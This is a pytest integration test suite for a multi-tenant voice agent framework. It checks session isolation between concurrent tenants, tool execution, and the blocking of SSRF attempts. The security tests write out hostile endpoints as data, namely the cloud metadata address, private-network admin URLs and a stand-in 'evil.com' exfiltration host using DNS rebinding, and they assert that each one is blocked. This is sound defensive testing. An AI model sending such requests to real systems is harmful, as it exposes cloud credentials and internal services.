"""Comprehensive Multi-Tenant Integration Test Suite for LiveKit Voice Agent Framework.

Phase 7 Integration Tests:
1. Concurrent Multi-Tenant Orchestration:
   - Concurrently dispatch Job 1 (customer_support blueprint with Aoede voice, instructions, custom reporting endpoint),
     Job 2 (virtual_receptionist blueprint with Puck voice, greeting utterance mode="say", distinct reporting endpoint),
     and Job 3 (appointment_booking with REST webhook tools).
   - Verify zero cross-talk, zero context contamination, and zero state leakage between concurrent jobs.
   - Verify each session's SessionContext remains strictly isolated in JobContext and shared proc.userdata.
   - Verify each session generates its own distinct model instance, effective prompt, tools, and telemetry report.

2. End-to-End SSRF and Security Penetration Test in Integration:
   - Test adversarial metadata trying to access cloud metadata (169.254.169.254), private subnets (10.0.0.0/8, 192.168.0.0/16),
     and DNS rebinding during concurrent execution.
   - Verify dead-letter logging safely records security blocks without worker crashes.
   - Verify legitimate concurrent jobs complete and report successfully without being impacted.

3. End-to-End Dynamic Tool Execution in Integration:
   - Test concurrent execution where Job A executes a REST WebhookTool against a mock server and receives
     structured JSON data, while Job B executes EndCallTool with audio buffer draining.

4. Multi-Tenant Fault Tolerance & Boundary Isolation:
   - Verify malformed tenant metadata fails fast without impacting concurrent healthy tenants.
   - Verify watchdog timer triggers in one tenant do not cancel or terminate concurrent tenants.
"""

from __future__ import annotations

import asyncio
from datetime import UTC, datetime
import json
from pathlib import Path
import socket
from typing import Any, Optional
from unittest.mock import AsyncMock, MagicMock, patch

import aiohttp
from aiohttp import web
import pytest

from agent_framework.config.schema import (
    InstructionsConfig,
    ModelsConfig,
    ReportingConfig,
    ReportingEndpointConfig,
    ReportingSecurityConfig,
    SessionConfig,
    ToolConfig,
    VoiceConfig,
)
from agent_framework.config.validator import MetadataValidationError
from agent_framework.core.context import (
    SessionContext,
    attach_to_job,
    detach_from_job,
    get_session_context,
)
from agent_framework.core.session import SessionCoordinator
from agent_framework.models.factory import ModelFactory
from agent_framework.reporting.dispatcher import DeliveryResult, ReportingDispatcher
from agent_framework.tools.builtin.end_call import (
    DEFAULT_FAREWELL_INSTRUCTION,
    EndCallTool,
)
from agent_framework.tools.registry import ToolRegistry
from agent_framework.tools.webhook_tool import WebhookTool
from livekit.agents import Agent, AgentSession, JobContext

PROJECT_ROOT = Path(__file__).resolve().parent.parent.parent


# ==============================================================================
# Ephemeral In-Process HTTP Test Server
# ==============================================================================
class IntegrationHttpServer:
    """Ephemeral aiohttp test server for webhook and telemetry verification."""

    def __init__(self) -> None:
        self.captured_requests: list[dict[str, Any]] = []
        self.url: str = ""
        self._runner: Optional[web.AppRunner] = None
        self._site: Optional[web.TCPSite] = None

    async def __aenter__(self) -> IntegrationHttpServer:
        app = web.Application()

        async def handle_post(request: web.Request) -> web.Response:
            body = await request.json() if request.can_read_body else {}
            self.captured_requests.append({
                "method": request.method,
                "path": request.path,
                "headers": {k.lower(): v for k, v in request.headers.items()},
                "body": body,
            })
            if "/availability" in request.path:
                return web.json_response({
                    "status": "available",
                    "slots": ["2026-11-21T09:00:00Z", "2026-11-21T14:00:00Z"],
                    "business": "Metro Wellness Center",
                })
            elif "/telemetry" in request.path or "/reports" in request.path or "/events" in request.path:
                return web.json_response({"status": "received", "report_id": "rep_ok_123"})
            return web.json_response({"status": "ok", "echo": body})

        app.router.add_post("/{tail:.*}", handle_post)

        self._runner = web.AppRunner(app)
        await self._runner.setup()
        self._site = web.TCPSite(self._runner, "127.0.0.1", 0)
        await self._site.start()

        port = self._site._server.sockets[0].getsockname()[1]
        self.url = f"http://127.0.0.1:{port}"
        return self

    async def __aexit__(self, exc_type: Any, exc_val: Any, exc_tb: Any) -> None:
        if self._runner is not None:
            await self._runner.cleanup()


# ==============================================================================
# Helper Mock Factories
# ==============================================================================
def make_mock_job_context(
    job_id: str,
    room_name: str,
    metadata_json: str,
    shared_userdata: Optional[dict[str, Any]] = None,
    remote_participants: Optional[dict[str, Any]] = None,
) -> MagicMock:
    """Creates a mock JobContext with optional shared userdata across concurrent jobs."""
    ctx = MagicMock(spec=JobContext)
    ctx.job = MagicMock()
    ctx.job.id = job_id
    ctx.job.metadata = metadata_json

    ctx.room = MagicMock()
    ctx.room.name = room_name
    ctx.room.metadata = ""
    ctx.room.remote_participants = remote_participants or {
        "user_part": MagicMock(identity=f"user_{job_id}", metadata="", attributes={})
    }
    ctx.room.disconnect = AsyncMock()

    ctx.connect = AsyncMock()
    ctx.wait_for_participant = AsyncMock()
    ctx.delete_room = AsyncMock()
    ctx.make_session_report = MagicMock(return_value={"report_id": f"rep_{job_id}", "status": "ok"})
    ctx.add_shutdown_callback = MagicMock()

    ctx.proc = MagicMock()
    ctx.proc.userdata = shared_userdata if shared_userdata is not None else {}

    return ctx


# ==============================================================================
# 1. Concurrent Multi-Tenant Orchestration Tests
# ==============================================================================
class TestConcurrentMultiTenantOrchestration:
    """Verifies concurrent execution of distinct application blueprints on the same worker."""

    @pytest.mark.asyncio
    async def test_concurrent_three_tenant_jobs_complete_isolation(self, monkeypatch: pytest.MonkeyPatch):
        """Concurrently dispatches Job 1 (Customer Support), Job 2 (Virtual Receptionist with Puck voice),
        and Job 3 (Appointment Booking with Webhook tool).

        Verifies:
        - Zero cross-talk or context contamination.
        - Strict isolation in JobContext and shared proc.userdata.
        - Distinct model instance, effective prompt, tools, and telemetry report per tenant.
        """
        # 1. Provide mock secrets required by blueprint headers
        env_secrets = {
            "SUPPORT_API_KEY": "secret_supp_token_123",
            "CRM_API_KEY": "secret_crm_token_456",
            "TELEMETRY_KEY": "secret_telem_token_789",
            "BOOKING_API_KEY": "secret_booking_token_999",
        }
        for k, v in env_secrets.items():
            monkeypatch.setenv(k, v)

        # 2. Load the 3 blueprints from disk
        support_path = PROJECT_ROOT / "examples" / "customer_support" / "support_metadata.json"
        receptionist_path = PROJECT_ROOT / "examples" / "virtual_receptionist" / "receptionist_metadata.json"
        booking_path = PROJECT_ROOT / "examples" / "appointment_booking" / "booking_metadata.json"

        with open(support_path, "r", encoding="utf-8") as f:
            support_data = json.load(f)
        with open(receptionist_path, "r", encoding="utf-8") as f:
            receptionist_data = json.load(f)
        with open(booking_path, "r", encoding="utf-8") as f:
            booking_data = json.load(f)

        # Configure distinct voices and endpoints per requirements:
        # Job 1: Aoede voice (default in support), custom reporting endpoint
        support_data["voice"]["voice_id"] = "Aoede"
        support_data["reporting"]["endpoint"]["url"] = "https://reports.tenant1-support.example.com/v1/telemetry"

        # Job 2: Puck voice, greeting mode="say", distinct reporting endpoint
        receptionist_data["voice"]["voice_id"] = "Puck"
        receptionist_data["instructions"]["first_turn"]["mode"] = "say"
        receptionist_data["instructions"]["first_turn"]["text"] = (
            "Good day! Thank you for calling Horizon Tower. My name is Morgan. How may I direct your call today?"
        )
        receptionist_data["reporting"]["endpoint"]["url"] = "https://reports.tenant2-reception.example.com/v1/telemetry"

        # Job 3: Appointment booking with check_availability REST webhook tool, distinct endpoint, Charon voice
        booking_data["voice"]["voice_id"] = "Charon"
        booking_data["reporting"]["endpoint"]["url"] = "https://reports.tenant3-booking.example.com/v1/telemetry"

        # 3. Setup shared worker process userdata (simulating all jobs running in same process)
        shared_worker_userdata: dict[str, Any] = {}

        ctx1 = make_mock_job_context(
            job_id="job_tenant_1_cust_supp",
            room_name="room_tenant_1",
            metadata_json=json.dumps(support_data),
            shared_userdata=shared_worker_userdata,
        )
        ctx2 = make_mock_job_context(
            job_id="job_tenant_2_recept",
            room_name="room_tenant_2",
            metadata_json=json.dumps(receptionist_data),
            shared_userdata=shared_worker_userdata,
        )
        ctx3 = make_mock_job_context(
            job_id="job_tenant_3_booking",
            room_name="room_tenant_3",
            metadata_json=json.dumps(booking_data),
            shared_userdata=shared_worker_userdata,
        )

        # 4. Spies and mocks for Model, Agent, AgentSession, and Telemetry
        created_models: list[tuple[str, Any, SessionConfig]] = []
        created_agents: list[tuple[Any, str, list[Any]]] = []
        session_instances: dict[str, MagicMock] = {}
        dispatched_reports: list[dict[str, Any]] = []

        def mock_create_model(session_config: SessionConfig) -> MagicMock:
            model_mock = MagicMock()
            model_mock.id = f"model_for_{session_config.agent.name}_{id(model_mock)}"
            model_mock.config = session_config.models
            created_models.append((session_config.agent.name, model_mock, session_config))
            return model_mock

        original_agent_init = Agent.__init__
        def spy_agent_init(self: Agent, *args: Any, **kwargs: Any) -> None:
            instructions = kwargs.get("instructions", "")
            tools = kwargs.get("tools", [])
            self._spy_instructions = instructions
            self._spy_tools = tools
            created_agents.append((self, instructions, tools))
            original_agent_init(self, *args, **kwargs)

        def mock_session_factory(*args: Any, **kwargs: Any) -> MagicMock:
            sess = MagicMock(spec=AgentSession)
            sess.start = AsyncMock()
            sess.say = AsyncMock()
            sess.generate_reply = AsyncMock()
            sess.aclose = AsyncMock()
            sess._kwargs = kwargs
            session_instances[f"session_{len(session_instances)}"] = sess
            return sess

        async def mock_send_session_report(
            ctx: Any,
            session_config: SessionConfig,
            lk_report: Any = None,
            error: Exception | None = None,
            termination_reason: str | None = None,
            **kwargs: Any,
        ) -> DeliveryResult:
            dispatched_reports.append({
                "job_id": ctx.job.id,
                "room_name": ctx.room.name,
                "url": session_config.reporting.endpoint.url if session_config.reporting.endpoint else None,
                "agent_name": session_config.agent.name,
                "role": session_config.agent.role,
                "metadata": session_config.metadata,
                "termination_reason": termination_reason,
            })
            return DeliveryResult(success=True, status_code=200, attempts=1)

        coordinator = SessionCoordinator()

        with (
            patch("agent_framework.core.session.ModelFactory.create_model", side_effect=mock_create_model) as patched_model_factory,
            patch("agent_framework.core.session.Agent.__init__", spy_agent_init),
            patch("agent_framework.core.session.AgentSession", side_effect=mock_session_factory) as patched_session_cls,
            patch("agent_framework.reporting.dispatcher.ReportingDispatcher.send_session_report", side_effect=mock_send_session_report),
        ):
            # 5. Concurrently run all three jobs on the coordinator
            await asyncio.gather(
                coordinator.run(ctx1),
                coordinator.run(ctx2),
                coordinator.run(ctx3),
            )

            # 6. Verify SessionContext and Model Isolation
            sc1 = get_session_context(ctx1)
            sc2 = get_session_context(ctx2)
            sc3 = get_session_context(ctx3)

            assert sc1 is not None and sc2 is not None and sc3 is not None
            assert sc1 is not sc2 and sc2 is not sc3 and sc1 is not sc3

            # Verify models are distinct, bound to SessionContext, and forwarded to AgentSession
            assert sc1.model is not None and sc2.model is not None and sc3.model is not None
            assert sc1.model is not sc2.model and sc2.model is not sc3.model and sc1.model is not sc3.model
            assert len(created_models) == 3
            assert len(created_agents) == 3
            assert len(session_instances) == 3

            # Verify models passed into AgentSession correspond to the distinct models
            assert sc1.session._kwargs["llm"] is sc1.model
            assert sc2.session._kwargs["llm"] is sc2.model
            assert sc3.session._kwargs["llm"] is sc3.model

            # Verify contexts are distinct in shared_worker_userdata
            assert f"_agent_framework_session_context:job_tenant_1_cust_supp" in shared_worker_userdata
            assert f"_agent_framework_session_context:job_tenant_2_recept" in shared_worker_userdata
            assert f"_agent_framework_session_context:job_tenant_3_booking" in shared_worker_userdata
            assert shared_worker_userdata["_agent_framework_session_context:job_tenant_1_cust_supp"] is sc1
            assert shared_worker_userdata["_agent_framework_session_context:job_tenant_2_recept"] is sc2
            assert shared_worker_userdata["_agent_framework_session_context:job_tenant_3_booking"] is sc3

            # 7. Verify Distinct Agent Instructions & Zero Cross-Talk
            agent1: Agent = sc1.agent
            agent2: Agent = sc2.agent
            agent3: Agent = sc3.agent

            # Job 1: Jordan / CloudServices
            assert "Jordan" in agent1.instructions
            assert "CloudServices" in agent1.instructions
            assert "portal.cloudservices.example.com" in agent1.instructions
            assert "Horizon Tower" not in agent1.instructions
            assert "Metro Wellness" not in agent1.instructions
            assert sc1.session_config.voice.voice_id == "Aoede"

            # Job 2: Morgan / Horizon Tower
            assert "Morgan" in agent2.instructions
            assert "Horizon Tower" in agent2.instructions
            assert "Suite 500" in agent2.instructions
            assert "CloudServices" not in agent2.instructions
            assert "Metro Wellness" not in agent2.instructions
            assert sc2.session_config.voice.voice_id == "Puck"

            # Job 3: Taylor / Metro Wellness Center with Charon voice
            assert "Taylor" in agent3.instructions
            assert "Metro Wellness Center" in agent3.instructions
            assert "America/New_York" in agent3.instructions
            assert "CloudServices" not in agent3.instructions
            assert "Horizon Tower" not in agent3.instructions
            assert sc3.session_config.voice.voice_id == "Charon"

            # 8. Verify Distinct Tools Configuration
            tool_names_1 = [t.id if hasattr(t, "id") else getattr(t, "name", "") for t in agent1.tools]
            tool_names_2 = [t.id if hasattr(t, "id") else getattr(t, "name", "") for t in agent2.tools]
            tool_names_3 = [t.id if hasattr(t, "id") else getattr(t, "name", "") for t in agent3.tools]

            # Job 1 has lookup_account and end_call
            assert "lookup_account" in tool_names_1
            assert "end_call" in tool_names_1
            assert "check_availability" not in tool_names_1

            # Job 2 has end_call
            assert "end_call" in tool_names_2
            assert "lookup_account" not in tool_names_2
            assert "check_availability" not in tool_names_2

            # Job 3 has check_availability, book_appointment, and end_call
            assert "check_availability" in tool_names_3
            assert "book_appointment" in tool_names_3
            assert "end_call" in tool_names_3
            assert "lookup_account" not in tool_names_3

            # 9. Verify First-Turn Execution
            session1: MagicMock = sc1.session
            session2: MagicMock = sc2.session
            session3: MagicMock = sc3.session

            session1.say.assert_awaited_once_with(
                "Thank you for calling CloudServices Support. My name is Jordan. How may I assist you with your account today?"
            )
            session2.say.assert_awaited_once_with(
                "Good day! Thank you for calling Horizon Tower. My name is Morgan. How may I direct your call today?"
            )
            session3.say.assert_awaited_once_with(
                "Hello! Thank you for calling scheduling services. My name is Taylor. What type of appointment can I help you book today?"
            )

            # 10. Concurrently Trigger Teardown & Verify Telemetry Reporting
            await asyncio.gather(
                coordinator.teardown(ctx1, termination_reason="Support resolved"),
                coordinator.teardown(ctx2, termination_reason="Caller hung up"),
                coordinator.teardown(ctx3, termination_reason="Appointment booked"),
            )

            assert len(dispatched_reports) == 3

            report1 = next(r for r in dispatched_reports if r["job_id"] == "job_tenant_1_cust_supp")
            report2 = next(r for r in dispatched_reports if r["job_id"] == "job_tenant_2_recept")
            report3 = next(r for r in dispatched_reports if r["job_id"] == "job_tenant_3_booking")

            # Check Report 1
            assert report1["url"] == "https://reports.tenant1-support.example.com/v1/telemetry"
            assert report1["role"] == "technical_support"
            assert report1["termination_reason"] == "Support resolved"

            # Check Report 2
            assert report2["url"] == "https://reports.tenant2-reception.example.com/v1/telemetry"
            assert report2["role"] == "receptionist"
            assert report2["metadata"] == {"facility": "horizon_hq"}
            assert report2["termination_reason"] == "Caller hung up"

            # Check Report 3
            assert report3["url"] == "https://reports.tenant3-booking.example.com/v1/telemetry"
            assert report3["role"] == "scheduler"
            assert report3["metadata"] == {"organization_id": "org_metro_wellness_04"}
            assert report3["termination_reason"] == "Appointment booked"

            # Verify Detachment and Clean State
            assert get_session_context(ctx1) is None
            assert get_session_context(ctx2) is None
            assert get_session_context(ctx3) is None
            assert len(shared_worker_userdata) == 0

    @pytest.mark.asyncio
    async def test_session_context_isolation_under_concurrency_stress(self, monkeypatch: pytest.MonkeyPatch):
        """Dispatches 10 concurrent sessions with alternating blueprints on the same worker process.
        Verifies zero race conditions, complete isolation, and clean cleanup."""
        monkeypatch.setenv("SUPPORT_API_KEY", "stress_support_token")
        monkeypatch.setenv("CRM_API_KEY", "stress_crm_token")
        monkeypatch.setenv("TELEMETRY_KEY", "stress_telem_token")
        shared_worker_userdata: dict[str, Any] = {}
        coordinator = SessionCoordinator()

        base_support_path = PROJECT_ROOT / "examples" / "customer_support" / "support_metadata.json"
        with open(base_support_path, "r", encoding="utf-8") as f:
            base_data = json.load(f)

        num_tenants = 10
        contexts: list[MagicMock] = []

        for i in range(num_tenants):
            tenant_data = dict(base_data)
            tenant_data["agent"] = {"name": f"agent_tenant_{i}", "role": f"role_{i}"}
            tenant_data["instructions"] = {
                "system_prompt": f"Instructions for tenant {i} specifically.",
                "spoken_dialogue_rules": False,
            }
            tenant_data["voice"] = {"voice_id": "Aoede" if i % 2 == 0 else "Puck"}
            tenant_data["reporting"] = {
                "enabled": True,
                "endpoint": {"url": f"https://reports.tenant{i}.com/post", "method": "POST"},
            }

            ctx = make_mock_job_context(
                job_id=f"stress_job_{i}",
                room_name=f"stress_room_{i}",
                metadata_json=json.dumps(tenant_data),
                shared_userdata=shared_worker_userdata,
            )
            contexts.append(ctx)

        with (
            patch("agent_framework.core.session.ModelFactory.create_model", side_effect=lambda cfg: MagicMock(id=f"model_{cfg.agent.name}")),
            patch("agent_framework.core.session.AgentSession") as mock_sess_cls,
            patch("agent_framework.reporting.dispatcher.ReportingDispatcher.send_session_report", new_callable=AsyncMock),
        ):
            mock_sess = MagicMock(spec=AgentSession)
            mock_sess.start = AsyncMock()
            mock_sess.say = AsyncMock()
            mock_sess.aclose = AsyncMock()
            mock_sess_cls.return_value = mock_sess

            # Concurrently launch all 10 jobs
            await asyncio.gather(*(coordinator.run(ctx) for ctx in contexts))

            # Verify all 10 have isolated session contexts in shared userdata
            assert len(shared_worker_userdata) == num_tenants
            for i, ctx in enumerate(contexts):
                sc = get_session_context(ctx)
                assert sc is not None
                assert sc.job_id == f"stress_job_{i}"
                assert sc.model is not None and sc.model.id == f"model_agent_tenant_{i}"
                assert sc.session_config.instructions.system_prompt == f"Instructions for tenant {i} specifically."
                assert sc.session_config.voice.voice_id == ("Aoede" if i % 2 == 0 else "Puck")
                assert f"_agent_framework_session_context:stress_job_{i}" in shared_worker_userdata

            # Concurrently teardown all 10
            await asyncio.gather(*(coordinator.teardown(ctx) for ctx in contexts))

            # Verify all detached
            assert len(shared_worker_userdata) == 0
            for ctx in contexts:
                assert get_session_context(ctx) is None


# ==============================================================================
# 2. SSRF and Security Penetration Test in Integration
# ==============================================================================
class TestMultiTenantSSRFAndSecurityPenetration:
    """Verifies adversarial metadata attempts to exploit SSRF/private networks are blocked safely."""

    @pytest.mark.asyncio
    async def test_concurrent_ssrf_attacks_blocked_and_dead_lettered(self, tmp_path: Path):
        """Concurrently runs a legitimate job alongside three adversarial jobs:
        - Job 1: Normal webhook endpoint
        - Job 2: Cloud IMDS metadata target (169.254.169.254)
        - Job 3: Private RFC 1918 target (10.254.1.1:8080)
        - Job 4: DNS Rebinding attack resolving to 169.254.169.254

        Verifies:
        - Adversarial jobs are rejected by SSRF security before HTTP dispatch.
        - Dead-letter files are created with structured error diagnostics.
        - Worker process does not crash.
        - Legitimate concurrent job succeeds normally.
        """
        dead_letter_dir = tmp_path / "dead_letter"

        # 1. Normal reporting config
        normal_config = SessionConfig(
            models=ModelsConfig(provider="gemini", model="gemini-3.8-live"),
            instructions=InstructionsConfig(system_prompt="Legitimate agent instructions"),
            voice=VoiceConfig(voice_id="Aoede"),
            reporting=ReportingConfig(
                enabled=True,
                endpoint=ReportingEndpointConfig(url="https://legitimate.service.com/telemetry"),
                security=ReportingSecurityConfig(validate_ssrf=True, allow_local=False),
            ),
        )

        # 2. Adversarial IMDS config
        imds_config = SessionConfig(
            models=ModelsConfig(provider="gemini", model="gemini-3.8-live"),
            instructions=InstructionsConfig(system_prompt="Adversarial IMDS injection"),
            voice=VoiceConfig(voice_id="Aoede"),
            reporting=ReportingConfig(
                enabled=True,
                endpoint=ReportingEndpointConfig(url="http://169.254.169.254/latest/meta-data/"),
                security=ReportingSecurityConfig(validate_ssrf=True, allow_local=False),
            ),
        )

        # 3. Adversarial RFC-1918 config
        rfc1918_config = SessionConfig(
            models=ModelsConfig(provider="gemini", model="gemini-3.8-live"),
            instructions=InstructionsConfig(system_prompt="Adversarial RFC 1918 probing"),
            voice=VoiceConfig(voice_id="Aoede"),
            reporting=ReportingConfig(
                enabled=True,
                endpoint=ReportingEndpointConfig(url="http://10.254.1.1:8080/internal-admin"),
                security=ReportingSecurityConfig(validate_ssrf=True, allow_local=False),
            ),
        )

        # 4. Adversarial DNS Rebinding config
        rebind_config = SessionConfig(
            models=ModelsConfig(provider="gemini", model="gemini-3.8-live"),
            instructions=InstructionsConfig(system_prompt="Adversarial DNS rebinding"),
            voice=VoiceConfig(voice_id="Aoede"),
            reporting=ReportingConfig(
                enabled=True,
                endpoint=ReportingEndpointConfig(url="https://attacker-rebind.evil.com/exfil"),
                security=ReportingSecurityConfig(validate_ssrf=True, allow_local=False),
            ),
        )

        shared_worker_userdata: dict[str, Any] = {}
        ctx_normal = make_mock_job_context("job_normal", "room_normal", json.dumps(normal_config.model_dump()), shared_userdata=shared_worker_userdata)
        ctx_imds = make_mock_job_context("job_imds", "room_imds", json.dumps(imds_config.model_dump()), shared_userdata=shared_worker_userdata)
        ctx_rfc = make_mock_job_context("job_rfc", "room_rfc", json.dumps(rfc1918_config.model_dump()), shared_userdata=shared_worker_userdata)
        ctx_rebind = make_mock_job_context("job_rebind", "room_rebind", json.dumps(rebind_config.model_dump()), shared_userdata=shared_worker_userdata)

        coordinator = SessionCoordinator(dead_letter_dir=dead_letter_dir)

        # Mock socket.getaddrinfo to handle legitimate DNS vs DNS rebinding
        original_getaddrinfo = socket.getaddrinfo
        def mock_getaddrinfo(host: str, port: Any, *args: Any, **kwargs: Any) -> Any:
            if host == "attacker-rebind.evil.com":
                # Simulated DNS rebinding resolving to AWS metadata IP
                return [(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("169.254.169.254", port))]
            if host == "legitimate.service.com":
                # Legitimate public IP
                return [(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("93.184.216.34", port))]
            return original_getaddrinfo(host, port, *args, **kwargs)

        # Mock aiohttp request for legitimate endpoint
        class MockHttpResponse:
            def __init__(self, status: int = 200, text: str = '{"status": "ok"}'):
                self.status = status
                self._text = text
            async def text(self) -> str:
                return self._text
            async def __aenter__(self):
                return self
            async def __aexit__(self, exc_type, exc_val, exc_tb):
                pass

        mock_req = MagicMock(return_value=MockHttpResponse(200, '{"result": "delivered"}'))
        mock_sess = MagicMock(spec=AgentSession)
        mock_sess.start = AsyncMock()
        mock_sess.say = AsyncMock()
        mock_sess.aclose = AsyncMock()

        with (
            patch("socket.getaddrinfo", side_effect=mock_getaddrinfo),
            patch("aiohttp.ClientSession.request", mock_req),
            patch("agent_framework.core.session.ModelFactory.create_model", return_value=MagicMock()),
            patch("agent_framework.core.session.AgentSession", return_value=mock_sess),
        ):
            # 1. Concurrently run all 4 jobs through SessionCoordinator
            await asyncio.gather(
                coordinator.run(ctx_normal),
                coordinator.run(ctx_imds),
                coordinator.run(ctx_rfc),
                coordinator.run(ctx_rebind),
            )

            # Verify all 4 jobs are registered and running concurrently on the shared worker
            assert len(shared_worker_userdata) == 4
            for ctx in (ctx_normal, ctx_imds, ctx_rfc, ctx_rebind):
                sc = get_session_context(ctx)
                assert sc is not None and sc.is_active

            # 2. Concurrently teardown all 4 jobs triggering post-session reporting
            # Legitimate job delivers cleanly; adversarial jobs are intercepted and dead-lettered
            await asyncio.gather(
                coordinator.teardown(ctx_normal, termination_reason="Legitimate complete"),
                coordinator.teardown(ctx_imds, termination_reason="IMDS attack attempt"),
                coordinator.teardown(ctx_rfc, termination_reason="RFC1918 scan attempt"),
                coordinator.teardown(ctx_rebind, termination_reason="DNS rebind attempt"),
            )

            # 3. Verify contents of dead-letter records for the 3 blocked jobs
            dead_letter_files = list(dead_letter_dir.glob("*.json"))
            assert len(dead_letter_files) == 3

            dead_letter_jobs = set()
            for dl_file in dead_letter_files:
                with open(dl_file, "r", encoding="utf-8") as f:
                    record = json.load(f)
                assert "timestamp" in record
                assert "error" in record
                reason = record["error"]["reason"].lower()
                assert "ssrf" in reason or "forbidden" in reason or "private" in reason or "blocked" in reason
                job_id = record["payload"].get("job_id") or record["payload"].get("session_id")
                dead_letter_jobs.add(job_id)

            assert dead_letter_jobs == {"job_imds", "job_rfc", "job_rebind"}

            # 4. Verify clean detachment: zero state leak in shared worker userdata
            assert len(shared_worker_userdata) == 0
            for ctx in (ctx_normal, ctx_imds, ctx_rfc, ctx_rebind):
                assert get_session_context(ctx) is None

    @pytest.mark.asyncio
    async def test_adversarial_webhook_tool_ssrf_rejection_during_concurrent_run(self):
        """Tests concurrent invocation of WebhookTools:
        - Job A executes a safe WebhookTool against a permitted test server.
        - Job B attempts to access cloud metadata (169.254.169.254).
        - Job C attempts to access internal loopback/private IP without authorization.
        - Job D attempts DNS rebinding pointing to 169.254.169.254.

        Verifies that Job B, Job C, and Job D are safely blocked without crashing Job A.
        """
        async with IntegrationHttpServer() as server:
            # Tool A: Safe tool calling local test server with allow_local=True
            tool_a = WebhookTool(
                name="safe_lookup",
                url=f"{server.url}/availability",
                method="POST",
                allow_local=True,
            )

            # Tool B: Adversarial tool attempting IMDS access
            tool_b = WebhookTool(
                name="imds_exploit",
                url="http://169.254.169.254/latest/meta-data/",
                method="GET",
                allow_local=False,
            )

            # Tool C: Adversarial tool attempting private IP scan
            tool_c = WebhookTool(
                name="private_scan",
                url="http://10.0.0.1:8080/admin",
                method="POST",
                allow_local=False,
            )

            # Tool D: Adversarial tool attempting DNS rebinding to cloud metadata
            tool_d = WebhookTool(
                name="dns_rebind_exploit",
                url="https://attacker-rebind.evil.com/leak",
                method="POST",
                allow_local=False,
            )

            original_getaddrinfo = socket.getaddrinfo
            def mock_getaddrinfo(host: str, port: Any, *args: Any, **kwargs: Any) -> Any:
                if host == "attacker-rebind.evil.com":
                    return [(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("169.254.169.254", port))]
                return original_getaddrinfo(host, port, *args, **kwargs)

            with patch("socket.getaddrinfo", side_effect=mock_getaddrinfo):
                # Execute all four concurrently
                res_a, res_b, res_c, res_d = await asyncio.gather(
                    tool_a({"service": "consultation"}),
                    tool_b({}),
                    tool_c({"cmd": "dump"}),
                    tool_d({"secret": "harvest"}),
                )

            # Parse results
            json_a = json.loads(res_a)
            json_b = json.loads(res_b)
            json_c = json.loads(res_c)
            json_d = json.loads(res_d)

            # Job A succeeded
            assert json_a.get("status") == "available"
            assert len(json_a.get("slots", [])) == 2

            # Job B blocked
            assert json_b.get("status") == "blocked"
            assert "SSRF" in json_b.get("error", "")

            # Job C blocked
            assert json_c.get("status") == "blocked"
            assert "SSRF" in json_c.get("error", "")

            # Job D blocked by DNS rebinding defense
            assert json_d.get("status") == "blocked"
            assert "SSRF" in json_d.get("error", "") or "DNS rebinding" in json_d.get("error", "")


# ==============================================================================
# 3. End-to-End Dynamic Tool Execution in Integration
# ==============================================================================
class TestConcurrentDynamicToolExecution:
    """Verifies concurrent execution of REST Webhook tools and EndCallTool audio buffer draining."""

    @pytest.mark.asyncio
    async def test_concurrent_webhook_and_end_call_drain(self):
        """Concurrently runs:
        - Job A: Executes REST WebhookTool against a mock server, receiving structured JSON.
        - Job B: Executes EndCallTool with an active speech handle, waiting for audio playout before teardown.

        Verifies:
        - Job A completes and returns valid JSON to model without interference.
        - Job B drains speech buffer and safely deletes room.
        - Zero interference between Job A and Job B during concurrent tool execution.
        """
        async with IntegrationHttpServer() as mock_server:
            # 1. Job A setup: WebhookTool calling mock_server
            tool_cfg = ToolConfig(
                name="check_availability",
                type="webhook",
                description="Check appointment openings",
                parameters={"type": "object", "properties": {"date": {"type": "string"}}},
                config={
                    "url": f"{mock_server.url}/availability",
                    "method": "POST",
                },
            )
            webhook_tool = WebhookTool.from_config(tool_cfg, allow_local=True)

            # 2. Job B setup: EndCallTool with speech handle drain
            end_call_tool = EndCallTool(
                name="end_call",
                farewell_instruction="Thank you for calling. Have a great day!",
                delete_room=True,
                drain_timeout_seconds=2.0,
            )

            mock_speech_handle = MagicMock()
            mock_speech_handle.done.return_value = False
            callbacks: list[Any] = []
            mock_speech_handle.add_done_callback.side_effect = lambda cb: callbacks.append(cb)

            mock_room_b = MagicMock()
            mock_room_b.disconnect = AsyncMock()

            mock_job_ctx_b = MagicMock()
            mock_job_ctx_b.room = mock_room_b
            mock_job_ctx_b.delete_room = AsyncMock()
            mock_job_ctx_b.shutdown = MagicMock()

            mock_run_ctx_b = MagicMock()
            mock_run_ctx_b.speech_handle = mock_speech_handle
            mock_run_ctx_b.session = None
            mock_run_ctx_b.room = mock_room_b
            mock_run_ctx_b.job_ctx = mock_job_ctx_b

            async def _run_job_a() -> str:
                # Executes webhook request
                return await webhook_tool({"date": "2026-11-21"})

            async def _run_job_b() -> str:
                # Executes end_call which schedules drain
                farewell = await end_call_tool(mock_run_ctx_b)
                # Simulate speech playout finishing after 50ms
                await asyncio.sleep(0.05)
                if callbacks:
                    callbacks[0](mock_speech_handle)
                # Wait for drain callback execution
                await asyncio.sleep(0.05)
                return farewell

            # Concurrently execute both jobs
            result_a, result_b = await asyncio.gather(_run_job_a(), _run_job_b())

            # Verify Job A
            data_a = json.loads(result_a)
            assert data_a["status"] == "available"
            assert "2026-11-21T09:00:00Z" in data_a["slots"]

            # Verify Job B
            assert result_b == "Thank you for calling. Have a great day!"
            mock_room_b.disconnect.assert_awaited_once()
            mock_job_ctx_b.delete_room.assert_awaited_once()
            mock_job_ctx_b.shutdown.assert_called_once_with(reason="end_call")

    @pytest.mark.asyncio
    async def test_concurrent_webhook_and_end_call_drain_with_speech_hang_timeout(self):
        """Tests concurrent tool execution where Job B's speech handle hangs (never emits complete).
        Verifies that Job B's drain_timeout_seconds forces teardown without hanging indefinitely,
        while Job A's WebhookTool concurrently completes and returns valid JSON.
        """
        async with IntegrationHttpServer() as mock_server:
            # 1. Job A setup: WebhookTool
            tool_cfg = ToolConfig(
                name="check_availability",
                type="webhook",
                description="Check appointment openings",
                parameters={"type": "object", "properties": {"date": {"type": "string"}}},
                config={"url": f"{mock_server.url}/availability", "method": "POST"},
            )
            webhook_tool = WebhookTool.from_config(tool_cfg, allow_local=True)

            # 2. Job B setup: EndCallTool with short 0.1s drain timeout
            end_call_tool = EndCallTool(
                name="end_call",
                farewell_instruction="Goodbye from hanging session!",
                delete_room=True,
                drain_timeout_seconds=0.1,
            )

